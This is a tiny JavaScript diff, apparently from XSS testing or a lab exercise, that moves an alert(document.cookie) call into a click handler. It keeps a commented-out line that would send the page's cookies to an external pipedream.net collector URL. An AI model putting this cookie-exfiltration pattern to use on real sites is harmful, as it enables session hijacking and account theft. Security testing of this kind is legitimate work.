@@ -4,5 +4,5 @@
 // word.oninput = () => {
 //    document.location.hash = word.value;
 // }
-alert(document.cookie);
+color.onclick = () => { alert(document.cookie); }
 //window.onhashchange="http://en7pctch52z3n.x.pipedream.net?cookie="+document.cookie
